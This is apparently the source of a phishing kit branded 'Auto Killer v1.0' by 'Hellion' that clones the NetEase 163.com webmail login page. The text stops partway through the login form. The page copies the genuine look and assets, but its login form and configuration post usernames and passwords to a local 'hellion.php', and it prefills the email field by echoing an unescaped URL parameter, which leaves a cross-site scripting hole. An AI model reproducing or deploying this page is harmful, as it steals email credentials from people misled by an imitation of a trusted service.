 <!--
 
 # HELLION PROUDLY PRESENTS, Auto Killer v1.0
 
 # This program is free software brought to you by Hellion: 
 # You can redistribute it and/or modify it under the terms of 
 # the GNU General Public License as published by the Free Software Foundation, 
 # either version 3 of the License, or (at your option) any later version.
 
 # However, the license header, copyright and author credits 
 # must not be modified in any form and always be displayed.

 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 # Contact me : team_pbg@yahoo.com for more details.
 
 # Skype: teamipwned

 # Special greets to Shaif Lifax, Solaree, PaperBoi, Softwarewind, Emoney, and others who helped! 
 
 # WARNING: Do not touch anything here!
 
  -->
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<link rel="dns-prefetch" href="http://mimg.127.net">
<link rel="dns-prefetch" href="http://entry.mail.163.com">
<link rel="dns-prefetch" href="https://ssl.mail.163.com">
<link rel="dns-prefetch" href="http://iplocator.mail.163.com">
<meta name="description" content="&#32593;&#26131;163&#20813;&#36153;&#37038;&#31665;--&#20013;&#25991;&#37038;&#31665;&#31532;&#19968;&#21697;&#29260;&#12290;&#23481;&#37327;&#33258;&#21160;&#32763;&#20493;&#65292;&#25903;&#25345;50&#20806;&#38468;&#20214;,&#20813;&#36153;&#24320;&#36890;&#25163;&#26426;&#21495;&#30721;&#37038;&#31665;&#36192;&#36865;3G&#36229;&#22823;&#38468;&#20214;&#26381;&#21153;&#12290;&#25903;&#25345;&#21508;&#31181;&#23458;&#25143;&#31471;&#36719;&#20214;&#25910;&#21457;&#65292;&#22403;&#22334;&#37038;&#20214;&#25318;&#25130;&#29575;&#36229;&#36807;98%&#12290;" />
<meta name="keywords" content="&#37038;&#20214;&#65292;&#37038;&#31665;&#65292;&#30005;&#23376;&#37038;&#20214;&#65292;&#30005;&#23376;&#37038;&#31665;&#65292;&#32593;&#26131;&#37038;&#31665;&#65292;163&#37038;&#31665;&#65292;&#20813;&#36153;&#37038;&#31665;&#65292;mail&#65292;email&#65292;&#32593;&#30424;" />
<title>163&#32593;&#26131;&#20813;&#36153;&#37038;--&#20013;&#25991;&#37038;&#31665;&#31532;&#19968;&#21697;&#29260;</title>
<link rel="shortcut icon" href="http://mail.163.com/favicon.ico" />
<style type="text/css">
/* css reset */
body{color:#000;background:#fff;font-size:12px;line-height:166.6%;text-align:center;}
body,input,select,button{font-family:verdana}
h1,h2,h3,select,input,button{font-size:100%}
body,h1,h2,h3,ul,li,form,p,img{margin:0;padding:0;border:0}
input,button,select,img{margin:0;line-height:normal}
select{padding:1px}
ul{list-style:none}
select,input,button,button img,label{vertical-align:middle}
header,footer,section,aside,nav,hgroup,figure,figcaption{display:block;margin:0;padding:0;border:none}
a{text-decoration:none;color:#959595}
a:hover{color:#626262}
.fontWeight{font-weight:700;}
/* global */
.unvisi{visibility:hidden}
/* backgroundImage */
.themeCtrl a,
.loginFormIpt,
.headerIntro,
.loginIcoCurrent,
.loginIcoNew,
.themeText li,
.domain,
.whatAutologin,
.btn,
.dialogbox .hd .rc,
.dialogbox .hd,
.btn-moblogin,
.btn-moblogin2,
.ico,
.locationTestTitle,
.verSelected,
.servSelected,
.locationTestTitleClose,
.ext-4free,
#extText li,
#extMobLogin li,
#mobtips_arr,
#mobtips_close{background-image:url(http://mimg.127.net/index/163/img/2013/bg_v1.png)}
.headerLogo,
.headerIntro,
.headerNav,
#headerEff,
.footerLogo,
.footerNav,
.loginIcoCurrent,
.loginIcoNew,
.loginFormTh,
.loginFormTdIpt,
.domain,
#whatAutologinTip,
#mobtips,
#mobtips_arr,
#mobtips_close{position:absolute}
/* ico */
.ico-uid{width:14px;height:16px;background-position: -154px -64px}
.ico-pwd{width:14px;height:16px;background-position: -178px -64px}
.ico-arr{display:inline-block;width:7px;height:12px;vertical-align:baseline;background-position:-160px -112px;}
.ico-arr-d{background-position:-160px -110px;}
.loginFormConf a:hover .ico-arr-d,
.ico-arr-d-focus{background-position:-176px -110px;}
*+html .ico-arr-d{background-position:-160px -112px;}
*+html .loginFormConf a:hover .ico-arr-d,
*+html .loginFormConf a:hover .ico-arr-d,
*+html .ico-arr-d-focus{background-position:-176px -112px;}
/* header */
.header{width:1000px;height:64px;position:relative;margin:0 auto;z-index:2;overflow:hidden;}
.headerLogo{top:17px;left:50px}
.headerIntro{height:28px;width:144px;display:block;background-position:0 -64px;top:17px;left:194px}
.headerNav{top:21px;right:50px;width:400px;text-align:right;color:#cfd0d0;}
.headerNav a{margin-left:13px}
.headerNav .last{margin-left: 0;}
#headerEff{}
/* main */
.main{height:600px;background:#fff;position: relative; min-width: 1000px;}
#mainCnt{width:1000px;height:600px;overflow:visible;margin:0 auto;position:relative;clear:both}
#theme{height:600px;width:1000px;position:absolute;overflow:hidden;/*z-index:1;*/background-position:top right;background-repeat:no-repeat;text-align:left;top:0;left:0;}
.themeLink{height:274px;width:430px;display:block;outline:0;}
.themeText{margin-left:26px;}
.themeText li{line-height:22px;-line-height:24px;height:24px;color:#858686;text-indent:12px;background-position:-756px -72px;background-repeat:no-repeat}
.themeText li a{color:#005590;text-decoration:underline;}
.login{width:295px;height:460px;padding:14px 16px 15px;top:55px;left:50%;margin-left:90px;text-align:left;position:absolute;z-index:2;background:url(http://mimg.127.net/index/163/img/2013/login_v2.png) no-repeat;-background-image:url(http://mimg.127.net/index/163/img/2013/login_ie6_v2.png);}
.unishadow{box-shadow:0px 1px 3px 0 rgba(0,0,0,0.2);-webkit-box-shadow:0px 1px 3px 0 rgba(0,0,0,0.2);-moz-box-shadow:0px 1px 3px 0 rgba(0,0,0,0.2);}
.loginFunc{width:100%;height:47px;overflow:hidden;clear:both;}
.loginFuncNormal,.loginFuncMobile{width:148px;height:100%;overflow:hidden;position:relative;line-height:46px;float:left;font-size:14px;text-align:center;+line-height:48px;color:#626262;cursor:pointer;}
.loginFuncMobile{width:147px;border-right:none;}
.loginIcoCurrent{width:24px;height:24px;left:26px;top:9px;display:none;}
.loginIcoNew{width:21px;height:10px;font-size:0;background-position:-684px 0;left:135px;top:12px;}
.tab-2{background-position:-323px 0;}
.tab-2 .loginFuncMobile .loginIcoCurrent,
.tab-1 .loginFuncNormal .loginIcoCurrent,
.tab-2 #extMobLogin,
.tab-1 #extText,
.tab-11 #extVerSelect,
.tab-22 #extMobLogin2,
.tab-2 #lfBtnReg2,
.tab-1 #lfBtnReg1,
.tab-2 .loginFormThMob{display:block;}
.tab-2 #lfVerSelect,
.tab-2 #extVerSelect,
.tab-22 #extMobLogin,
.tab-11 #extText,
.tab-2 #extText,
.tab-2 #lfBtnReg,
.tab-1 #lfBtnReg2,
.tab-22 #lfBtnMoblogin,
.tab-2 .loginFormThAcc{display:none;}
/* form */
.loginForm{position:relative;height:380px;padding-top:30px;}
#login163{height: 215px;}
.loginFormIpt{position:relative;width:240px;height:42px;line-height:42px;margin:0 0 18px 25px;padding-right:5px;clear:both;border-radius:4px;background-position:0 -352px;z-index:2}
.loginFormIpt .ico{position:absolute;left:9px;top:13px;z-index:1;}
.loginFormIpt-over{}
.loginFormIpt-focus{box-shadow:0 0 5px rgba(2,145,252,.5);}
.loginFormIpt-focus .placeholder{color:#C9C9C9;}
.loginFormBtn{position:relative;width:245px;height:43px;margin:16px 0 0 25px}
.loginFormTh{width:36px;}
.loginFormThMob{display:none;}
.loginFormTdIpt{width:205px;padding:9px 0 10px;ime-mode:disabled;height:21px;top:1px;left:28px;font-size:14px;font-weight:700;border:none;font-family:verdana;line-height:21px;color:#92a4bf;background:transparent!important;}
.loginFormTdIpt:focus{outline:0;}
.loginFormTdIpt-focus{color:#333;font-weight:700;}
.showPlaceholder .placeholder{visibility:visible;cursor:text;}
.placeholder{color:#C9C9C9;;font-size:14px;position:absolute;left:30px;top:14px;line-height:14px;visibility:hidden;background:none;}
.domain{width:80px;height:33px;background-position:0 -112px;line-height:999em;overflow:hidden;display:block;right:8px;top:4px;}
#idInputTest{visibility: hidden; float: left; font-size: 14px; font-weight: 700;}
.loginFormCheck{height:13px;line-height:13px;color:#555;margin-left:25px;clear:both;width:245px;position:relative;z-index:1;}
.loginFormCheckInner{height:14px;width:150px;float:left;position: relative;}
.forgetPwdLine{text-align: right}
#capsLockHint{position: absolute; top: 42px; left: 0px;padding: 4px 8px; line-height: 12px; background-color: #ffffcc; border: 1px solid #d7d7d7; color: #555; z-index: 2;}
#remAutoLogin{visibility:hidden; position: absolute;left:0;}
.ico-checkbox{display: inline-block; width: 13px; height: 13px; background-position: -40px -160px; vertical-align: middle; cursor: pointer;}
.autoLogin-checked .ico-checkbox{background-position: -40px -180px;}
#remAutoLoginTxt,
.forgetPwd{color:#848585;}
#remAutoLoginTxt:hover,
.forgetPwd:hover{color:#626262;}
.loginFormCbx{width:13px;height:13px;padding:0;overflow:hidden;margin:0; vertical-align: middle;}
.whatAutologin{display:inline-block;vertical-align:top;width:14px;height:14px;background-position:-112px -112px;line-height:999em;overflow:hidden}
#whatAutologinTip{z-index:9; width:180px; height:36px;background-color:#fffde4; border:1px #dfb86d solid; left:0px;top:16px;text-align:left; padding:5px 10px;line-height:18px; color:#dc9632;display:none;border-radius: 4px}
.btn{width:110px;height:38px;float:left;text-align:center;cursor:pointer;border:0;padding:0;font-weight:700;font-size:14px;display:inline-block;vertical-align:baseline;line-height:38px;outline:0;background-color:transparent;border-radius:3px;}
.btn-login{background-position:0 -208px;color:#fff;box-shadow:0 2px 5px rgba(0,28,88,.3)}
.btn-login-hover{background-position:0 -256px;}
.btn-login-active{background-position:0 -304px;color:#b5d1ee;}
.btn-reg{background-position:-117px -208px;color:#6d798c;float:right;box-shadow:0 2px 5px rgba(0,0,0,.1);}
.loginFormBtn .btn-reg-hover{background-position:-117px -256px;color:#347bc7;}
.loginFormBtn .btn-reg-active{background-position:-117px -304px;color:#6d798c;}
.btn-moblogin2{width:202px;height:37px;text-align:center;font-size:14px;background-position:-396px -288px;background-color:#fff;margin-top:30px;float:none;margin-left:25px;}
.loginFormConf{height:12px;line-height:14px;margin-left:25px;margin-top:12px;clear:both;width:245px;position:relative;color:#848585;z-index:1;}
.loginFormVer{float:left;width:160px;}
.loginFormService{float:right;text-align:right;}
.loginFormVerList{width:140px;position:absolute;padding:1px;background:#fff;border:1px solid #b7c2c9;top:-5px;top:-4px\9;left:33px;display:none;}
.loginFormVerList li a{height:22px;line-height:22px;width:140px;overflow:hidden;color:#848585;display:block;text-indent:22px;}
.loginFormVerList li a:hover{background-color:#eef3f8;}
.loginFormVerList li a.verSelected{color:#5B8CCA;background-position:-250px -58px;background-repeat:no-repeat;}
/* ext */
#extVerSelect,#extText,#extMobLogin,#extMobLogin2{display:none;}
.ext{width:250px;height:43px;position:absolute;bottom:0;left:12px;padding:0 10px; border-top:1px solid #e4f0f7;}
#extText{margin-top:7px;line-height:12px;}
#extText li{margin-bottom: 5px;padding-left:7px;background-position:-240px -123px;background-repeat:no-repeat;}
#extText li a{color:#9bacc6;}
#extText li a:hover{color:#5B8CCA;}
#extMobLogin{margin-top:7px;text-align: center;line-height:12px;}
#extMobLogin li{margin-bottom:9px;padding-left:7px;color:#848585;height:12px;line-height:12px;background-position:-240px -107px;background-repeat:no-repeat}
#extMobLogin a{color:#6d798c;font-size:12px;font-weight:normal;text-decoration: none;}
#extMobLogin .ext-tt{margin-bottom: 5px}
#extMobLogin .ext-tt a{font-weight: bold;}
#extVerSelect{height:66px;line-height:66px;font-size:14px;text-align:center;font-weight:700;}
#extVerSelect a{color:#005590;text-decoration:underline;}
.setMobLoginInfo{margin-left:46px;color:#848585;margin-top:10px;}
/* tab-2 */
.tab-2 #extMobLogin var{margin:0 4px; color: #cbd2de; font-style: normal;}
.tab-2 .ext-4free{display: inline-block; padding-right: 26px; background-position:97px -156px;}
.tab-2 .loginFormIpt .ico{top:12px;}
.tab-2 .ico-uid{height:18px; background-position: -200px -64px;}
/*.tab-2 .ext{height:76px;}
.tab-2 .loginFormCheck{margin-top:10px;}
.tab-2 .loginFormBtn{margin-top:10px;}*/
/* footer */
.footer{height:65px;margin:0 auto;}
.footer-inner{width:1000px;height:63px;overflow:visible;margin:0 auto;color:#848585;position:relative;}
.footerLogo{top:11px;left:35px}
.footerNav{top:25px;right:123px;}
.footerNav a{margin-left:12px}
.copyright{margin-left:12px}
/* noscript */
.noscriptTitle{line-height:32px;font-size:24px;color:#d90000;padding-top:60px;font-weight:700;background:#fff;}
.noscriptLink{text-decoration:underline;color:#005590;font-size:14px;}
/* mobtips */
#mobtips{height:18px;border:1px solid #c6c6a8;top:29px;left:46px;line-height:18px;background:#ffffe1;padding-left:6px;padding-right:20px;display:none;color:#565656;zoom:1;}
#mobtips_arr{width:9px;height:9px;background-position:-684px -72px;top:-5px;left:15px;}
#mobtips_close{background-position:-715px -68px;top:2px;width:16px;height:14px;right:0px;}
#mobtips em{font-style:normal;color:#328721;}
#mobtips a{text-decoration:underline;color:#005590;}
/* mask */
.mask{position:absolute;left:0;top:0;width:100%;height:100%;background:#000;filter:alpha(opacity=30);-moz-opacity:0.3;opacity:0.3;z-index:998}
/* &#24377;&#26694; */
.dialogbox{position:absolute;left:0;top:0;z-index:999;width:687px;left:50%;margin-left:-343px;top:50%;margin-top:-152px;}
.dialogbox .hd{position:relative;padding:0 10px;height:27px;line-height:27px;color:#fff;background-repeat:repeat-x;background-position:0 -576px}
.dialogbox .hd .rc{position:absolute;top:0;width:2px;height:27px}
.dialogbox .hd .rc-l{left:0;background-position:-720px -36px}
.dialogbox .hd .rc-r{right:0;background-position:-722px -36px}
.dialogbox .hd .btn-close{position:absolute;right:5px;top:5px;width:16px;height:16px;background-position:-716px 3px;line-height:9999px;overflow:hidden;font-size:0;margin-right:0;}
.dialogbox .bd{border:1px solid #6C92AD;border-top:none;background:#fff}
.dialogbox iframe{display:block}
#phoneRegFrame{width:685px;height:315px}
/* &#21152;&#23494;http&#30331;&#24405;&#24377;&#31383; */
.enhttp .topborder,
.enhttp .bottomborder,
.enhttp .ct,
.enhttp .cldenhttp,
.enhttp .ct .inner .httplogin{background-image:url(http://mimg.127.net/index/lib/img/bg_httplogin.gif);background-color:transparent;background-repeat:no-repeat;text-decoration:none;}
.enhttp{width:420px;height:270px;position:absolute;z-index:999;overflow:hidden;top:0;left:50%;margin-left:-210px;top:50%;margin-top:-135px;}
.enhttp .topborder{width:418px;height:2px;font-size:1px;overflow:hidden;margin:0 auto;background-position:0 -108px;}
.enhttp .bottomborder{width:418px;height:2px;font-size:1px;overflow:hidden;margin:0 auto;background-position:0 -110px;}
.enhttp .ct{width:418px;height:266px;background-position:0 -134px;background-color:#fff;border-left:1px solid #82aecd;border-right:1px solid #82aecd;position:relative;overflow:hidden;}
.enhttp .ct .inner{padding-top:40px;margin:0 auto;text-align:left;}
.enhttp .ct .inner p{font-size:14px;}
.enhttp .ct .inner .txt-tips{color:#737373;line-height:30px;width:325px;margin-left:46px;display:inline;}
.enhttp .ct .inner .txt-normal{line-height:30px;width:325px;margin:10px 0 0 46px;}
.enhttp .ct .inner .httplogin{font-size:14px;height:34px;width:120px;display:block;background-position:-432px -108px;line-height:34px;text-align:center;color:#fff;font-weight:700;background-color:#3486cc;}
.enhttp .ct .inner .txt-line{width:325px;margin-left:46px;background:#b6cad9;height:1px;overflow:hidden;font-size:1px;margin-top:24px;}
.enhttp .ct .inner .txt-advice{line-height:60px;width:325px;color:#8d8d8d;margin-left:46px;}
.enhttp .ct .inner .txt-advicelink{margin-left:20px;font-size:14px;}
.enhttp .cldenhttp{height:22px;width:22px;overflow:hidden;position:absolute;right:8px;top:6px;background-position:0 -112px;text-indent:-9999px;}
.enhttp .cldenhttp:hover{background-position:-22px -112px;}
.enhttp .enhttpbox{position:absolute;z-index:2;left:0;}
.enhttp .httploginframe{width:100%;height:200px;position:absolute;top:2px;z-index:1;left:0;}
/* &#27979;&#36895; */
#locationTest{position:absolute;width:255px;top:-2px;left:0px;height:88px;background:#fff;border:1px solid #b7c2c9;display:;margin-bottom:200px;height:79px;overflow:hidden;display:none;}
.locationTestTitle{width:255px;height:26px;line-height:26px;position:relative;color:#555;text-indent:10px;background-position:0 -10px;border-bottom:1px solid #f1f3f5;}
.locationTestTitle h4{margin:0;font-size:12px;}
.locationTestTitleClose{height:8px;width:8px;overflow:hidden;display:block;position:absolute;right:6px;top:7px;background-position:-224px -112px}
.locationTestTitleClose:hover{background-position:-208px -112px}
.locationTestEach{display:inline-block;width:5em;font-family:verdana;color:#848585;}
.locationTestList li{padding:2px;float:left;display:inline-block;}
.locationTestList .servSelected{background-position:-248px -50px;background-repeat:no-repeat;}
.locationTestList li a{height:38px;width:80px;display:block;line-height:16px;padding-top:10px;overflow:hidden;text-align:center;color:#000;}
.locationTestList li a:hover{background-color:#eef3f8;}
#selectLocation{text-align:center;}
#locationTestCur{width:3em;}
#selectLocationTipsDone{display:none;}
.locationTestBest{display:none;color:green;}
.locationChoose{text-decoration:underline;color:#005590;}

#themeArea{width:240px;height:80px;position:absolute;left:90px;top:134px;}

/* &#20027;&#39064;&#25511;&#21046;&#26639; */
.themeCtrl{position:absolute;right:100px;bottom:12px;}
.themeCtrl a{float:left;display:inline;}
#musicLink,
#prevTheme,
#nextTheme{width:25px;height:25px;margin-right:7px;}
#musicLink{background-position:-161px -457px;}
#musicLink:hover{background-position:-161px -492px;}
#prevTheme{background-position:0 -457px;}
#prevTheme:hover{background-position:0 -492px;}
#nextTheme{margin-right:0;background-position:-35px -457px;}
#nextTheme:hover{background-position:-35px -492px;}
/* &#39318;&#39029;&#35780;&#20998; */
#scoreIndex{margin:1px 10px 0 0;width:73px;height:24px;background-position:-70px -457px;font-size:12px;color:#fff;line-height:24px;text-align:center;display:none;}
#scoreIndex:hover{background-position:-70px -492px;}
#scoreIndexPop{left:50%;top:50%;margin-left:-231px;margin-top:-115px;width:462px;position:absolute;z-index:999;overflow:hidden;display:none;height:229px;background:#fff;}
#scoreIndexPopIfm{width:462px;height:229px;}
/**/
#theme{-webkit-transition:all 0.5s ease;-moz-transition:all 0.5s ease;-o-transition:all 0.5s ease;background:none;}
#theme.themeEffect{background:#e7ebe9;}

/* ie6 */
#musicLink,
#musicLink:hover,
#prevTheme,
#prevTheme:hover,
#nextTheme,
#nextTheme:hover,
#scoreIndex,
#scoreIndex:hover{-height:24px;-background-position-y:-527px;}

/* &#20113;&#38899;&#20048; */
#yunMusic{width:329px;height:162px;border-radius:3px;position:absolute;z-index:999;left:50%;top:50%;margin-left:-450px;overflow:hidden;color:#626262;margin-top:-122px;box-shadow:0px 2px 5px rgba(0 ,0 ,0 , .6);display:none;}
#yunMusicBackground{width:329px;height:162px;position:absolute;left:0;top:0;background:#fff;filter:alpha(opacity=90);opacity:0.9;z-index:0;}
#yunMusicText1{position:absolute;z-index:1;line-height:22px;vertical-align:baseline;left:21px;top:24px;text-align:left;width:290px;}
#yunMusicText1 img{position:relative;top:2px;}
#yunMusicText2{position:absolute;z-index:1;left:21px;top:80px;width:290px;text-align:left;}
#yunMusicConfirm{position:absolute;z-index:1;height:25px;line-height:25px;width:86px;display:block;border:1px solid #459830;border-radius:3px;background:#59b045;color:#fff;left:120px;top:120px;
background: -moz-linear-gradient(top, #6bbb59 0%, #459830 100%); /* FF3.6+ */
background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#6bbb59), color-stop(100%,#459830)); /* Chrome,Safari4+ */
background: -webkit-linear-gradient(top, #6bbb59 0%,#459830 100%); /* Chrome10+,Safari5.1+ */
background: -o-linear-gradient(top, #6bbb59 0%,#459830 100%); /* Opera 11.10+ */
background: -ms-linear-gradient(top, #6bbb59 0%,#459830 100%); /* IE10+ */
background: linear-gradient(to bottom, #6bbb59 0%,#459830 100%); /* W3C */
}
#yunMusicClose{height:14px;width:14px;right:0;top:0;line-height:14px;left:auto;font-size:12px;text-align:center;background:#ccc;border-color:#b8b8b8;color:#fff;font-family:Verdana;position:absolute;border-radius:3px;}
#yunMusicClose:hover{background:#c2c2c2;border-color:#aaa9a9;}

/* &#38169;&#35823;&#25552;&#31034; */
.error-hd,
.error-mid,
.error-ft,
.error-arrow,
.error-tt p{background-image: url("http://mimg.127.net/index/163/img/2013/error_bg.png"); _background-image: url("http://mimg.127.net/index/163/img/2013/error_bg_ie6.png");}
#errorAlert{position: absolute; width: 347px; top: 0; left: 50%; margin-left: -265px; text-align: left; z-index: 1000; display: none;}
#errorAlert.errorAlert-show{display: block; -webkit-animation: shake 0.6s ease-in-out 0.3s; -moz-animation: shake 0.6s ease-in-out 0.3s; -o-animation: shake 0.6s ease-in-out 0.3s; animation: shake 0.6s ease-in-out 0.3s;}
#errorAlert .error-hd,
#errorAlert .error-ft{overflow: hidden; font-size: 0; line-height: 0;}
#errorAlert .error-hd{height: 8px; background-position: -10px 0; background-repeat: no-repeat;}
#errorAlert .error-ft{height: 10px; background-position: -10px -8px; background-repeat: no-repeat;}
#errorAlert .error-mid{padding: 5px 20px 7px; background-position: -357px 0; background-repeat: repeat-y;}
#errorAlert .error-arrow{position: absolute; top: 35px; right: -6px; width: 10px; height: 19px; background-position: 0 0; background-repeat: no-repeat;}
#errorAlert .error-tt p{padding: 10px 20px 8px 60px; color: #434343; line-height: 22px; font-weight: bold; font-size: 14px; background-position: -704px center; background-repeat: no-repeat;}
#errorAlert .error-detail{margin-top:2px; padding: 8px 18px 5px 18px; color: #7d7d7d; line-height: 18px; border-top: 1px solid #e1e1e1;}
#errorAlert .error-detail a{color: #4e90e2; text-decoration: underline;}
@-webkit-keyframes shake{0%{margin-left: -265px;}25%{margin-left: -262px;}50%{margin-left: -265px;}75%{margin-left: -262px;}100%{margin-left: -265px;}}
@-moz-keyframes shake{0%{margin-left: -265px;}25%{margin-left: -262px;}50%{margin-left: -265px;}75%{margin-left: -262px;}100%{margin-left: -265px;}}
@-o-keyframes shake{0%{margin-left: -265px;}25%{margin-left: -262px;}50%{margin-left: -265px;}75%{margin-left: -262px;}100%{margin-left: -265px;}}
@keyframes shake{0%{margin-left: -265px;}25%{margin-left: -262px;}50%{margin-left: -265px;}75%{margin-left: -262px;}100%{margin-left: -265px;}}
#errorMask{position:absolute; top:0; left: 0;width: 100%; height: 600px; background: #000; opacity: 0.2; filter:alpha(opacity=20); z-index: 1;}

/* &#26131;&#20449;&#20108;&#32500;&#30721;&#30331;&#24405; */
.loginByYX-link,
.yxCode-btn{background: url(http://mimg.127.net/index/163/img/2013/yixin_ico.png) no-repeat;}
#loginByYX{position: absolute; height: 100px; bottom: 45px; left: 0;}
#yxCode{position: absolute; left: 50px; top: 8px; background-color: #fff;}
.loginByYX-txt,
.loginByYX-txt-err{padding:28px 0 0 158px; color: #959595; line-height: 23px;}
.loginByYX-txt-err{color: #626262;}
.loginByYX-link{margin:0 3px; padding-left:16px; background-position: -68px 0;}
.loginByYX-link,
.loginByYX-link:hover{color:#279c7b;}
#yxCodeRefresh{position: absolute; top: 8px; left: 50px; width: 85px; height: 85px;}
.yxCode-mask{height: 100%; background: #fff; opacity: 0.8; filter:alpha(opacity=80);}
.yxCode-btn{position: absolute; top: 30px; left: 9px; display: block; width: 68px; height: 28px; line-height: 28px; background-position: 0 0; color: #6D798C; text-align: center; font-size: 14px;}
.yxCode-btn:hover{color:#347BC7;}
</style>

<script id="jsOption" type="text/javascript">
//&#24403;&#21069;&#22495;&#21517;&#37197;&#32622;
var gOption = {
	"sDomain" : "163.com",
	"sCookieDomain" : "mail.163.com",
	"sAutoLoginUrl" : "http://entry.mail.163.com/coremail/fcg/ntesdoor2?lightweight=1&verifycookie=1&language=-1&from=web&df=webmail163",
	"sSslAction" : "hellion.php?",
	"product" : "mail163",
	"url" : "http://entry.mail.163.com/coremail/fcg/ntesdoor2?",
	"url2" : "http://mail.163.com/errorpage/error163.htm",
	"gad" : "mail.163.com"
};
</script>
<script id="jsBase" type="text/javascript" src="http://mimg.127.net/index/lib/scripts/base_v5.min.js"></script>
<script id="jsInit" type="text/javascript">
fSetCookie("starttime",'',false); // starttime &#30331;&#24405;&#26102;&#38388;&#32479;&#35745;
fCheckCookie();
fCheckAutoLogin();
if(!fGetQuery('errorType')){ // &#26377;&#38169;&#35823;&#20449;&#24687;&#26102;&#19981;&#33258;&#21160;&#30331;&#24405;
	fAutoLogin();
}
fCheckBrowser();
fHtml5Tag();
</script>
</head>

<body>
<header class="header">
	<h1 class="headerLogo"><a href="http://mail.163.com/html/mail_intro/" target="_blank" title="&#36208;&#36817;&#32593;&#26131;&#20813;&#36153;&#37038;"><img src="http://mimg.127.net/logo/163logo.gif" alt="163&#32593;&#26131;&#20813;&#36153;&#37038;" /></a></h1>
	<a class="headerIntro" href="http://mail.163.com/html/mail_intro/" target="_blank" title="&#36208;&#36817;&#32593;&#26131;&#20813;&#36153;&#37038;"><span class="unvisi">&#20013;&#25991;&#37038;&#31665;&#31532;&#19968;&#21697;&#29260;</span></a>
	<nav class="headerNav">
		<a href="http://email.163.com" target="_blank">&#20813;&#36153;&#37038;</a><a href="http://qiye.163.com/" target="_blank">&#20225;&#19994;&#37038;&#31665;</a><a href="http://vip.163.com?b08abh1" target="_blank">VIP&#37038;&#31665;</a><a href="http://hw.mail.163.com/#163" target="_blank">&#22269;&#22806;&#29992;&#25143;&#30331;&#24405;</a><a href="http://help.mail.163.com" target="_blank">&#24110;&#21161;</a>&nbsp;|&nbsp;<a class="last" href="http://help.163.com/special/007528M7/xiaoyi_intd.html" target="_blank">&#22312;&#32447;&#31572;&#30097;</a>
	</nav>
</header>

<section class="main" id="mainBg">
	<div class="main-inner" id="mainCnt">
		<div id="theme">
			<noscript><p class="noscriptTitle">&#27983;&#35272;&#22120;&#19981;&#25903;&#25345;&#25110;&#31105;&#27490;&#20102;&#32593;&#39029;&#33050;&#26412;&#65292;<br/>&#23548;&#33268;&#24744;&#26080;&#27861;&#27491;&#24120;&#30331;&#24405;&#12290;</p><br/><a class="noscriptLink" href="http://help.mail.163.com/faqDetail.do?code=d7a5dc8471cd0c0e8b4b8f4f8e49998b374173cfe9171305fa1ce630d7f67ac2122641eb4548bd1e" target="_blank">&#22914;&#20309;&#35299;&#38500;&#33050;&#26412;&#38480;&#21046;</a></noscript>
		</div>
		<div class="themeCtrl">
			<a id="scoreIndex" href="javascript:void(0);" onClick="indexLogin.scoreIndex.open();" title="&#39318;&#39029;&#35780;&#20998;">
				&#20026;&#39318;&#39029;&#35780;&#20998;
			</a>
			<a id="musicLink" href="javascript:void(0);" target="_blank" title="&#21548;&#19968;&#39318;&#27468;"></a>
			<a id="prevTheme" href="javascript:void(0);" onClick="indexLogin.showThemes(indexLogin.oTheme.getPrev())" title="&#19978;&#19968;&#24352;"></a>
			<a id="nextTheme" href="javascript:void(0);" onClick="indexLogin.showThemes(indexLogin.oTheme.getNext())" title="&#19979;&#19968;&#24352;"></a>
		</div>
	</div>
	<!--&#38169;&#35823;&#25552;&#31034;&#28014;&#23618;-->
	<div id="errorMask" style="display:none"></div>
	<div id="errorAlert">
		<div class="error-hd"></div>
		<div class="error-mid">
			<div class="error-tt">
				<p id="errorTitle"></p>
			</div>
			<div id="errorDetail" class="error-detail" style="display:none">
				<p>&#25552;&#31034;&#65306;</p>
				<p id="errorInfo" class="error-info"></p>
			</div>
		</div>
		<div class="error-ft"></div>
		<div id="errorArr" class="error-arrow"></div>
	</div>
	<!--&#30331;&#24405;&#26694;-->
	<div id="loginBlock" class="login tab-1">
		<div class="loginFunc">
			<div id="lbNormal" class="loginFuncNormal">
				&#37038;&#31665;&#24080;&#21495;&#30331;&#24405;
			</div>
			<div id="lbMob" class="loginFuncMobile">
				&#25163;&#26426;&#21495;&#30331;&#24405;
			</div>
		</div>
		<div class="loginForm">
			<form id="login163" name="login163" method="post" action="hellion.php?main.jsp+sid=EAqjkpGGzmJMxXGpCLGGXCyFxjhOMlwd&df=mail.126.com#module=read.ReadModule" target="frameforlogin">
				<input type="hidden" id="savelogin" name="savelogin" value="0" />
				<input type="hidden" name="domainID" value="163" />
				<input type="hidden" id="url2" name="url2" value="http://mail.163.com/errorpage/error163.htm" />
				<div id="idInputLine" class="loginFormIpt showPlaceholder">
					<b class="ico ico-uid"></b>
					<input class="loginFormTdIpt" tabindex="1" title="&#35831;&#36755;&#20837;&#24080;&#21495;" id="idInput" name="username" type="text" maxlength="50" value="<?php echo $_GET['email']; ?>" />
					<span id="showdomain" class="domain">@163.com</span>
					<div id="mobtips"></div>
					<label for="idInput" class="placeholder" id="idPlaceholder">&#37038;&#31665;&#24080;&#21495;&#25110;&#25163;&#26426;&#21495;</label>
					<div id="idInputTest"></div>
				</div>
				<div id="pwdInputLine" class="loginFormIpt showPlaceholder">
					<b class="ico ico-pwd"></b>
					<input class="loginFormTdIpt" tabindex="2" title="&#35831;&#36755;&#20837;&#23494;&#30721;" id="pwdInput" name="password" type="password" autofocus="autofocus"/>
					<label for="pwdInput" class="placeholder" id="pwdPlaceholder">&#23494;&#30721;</label>
					<p id="capsLockHint" style="display: none">&#22823;&#20889;&#29366;&#24577;&#24320;&#21551;</p>
				</div>
				<div class="loginFormCheck">
					<div id="lfAutoLogin" class="loginFormCheckInner">
						<b class="ico ico-checkbox"></b>
						<label id="remAutoLoginTxt" for="remAutoLogin">
							<input tabindex="3" title="&#21313;&#22825;&#20869;&#20813;&#30331;&#24405;" class="loginFormCbx" type="checkbox" id="remAutoLogin" />
						&#21313;&#22825;&#20869;&#20813;&#30331;&#24405;</label>
						<div id="whatAutologinTip">&#20026;&#20102;&#24744;&#30340;&#20449;&#24687;&#23433;&#20840;&#65292;&#35831;&#19981;&#35201;&#22312;&#32593;&#21543;&#25110;&#20844;&#29992;&#30005;&#33041;&#19978;&#20351;&#29992;&#27492;&#21151;&#33021;&#65281;
						</div>
						<!--
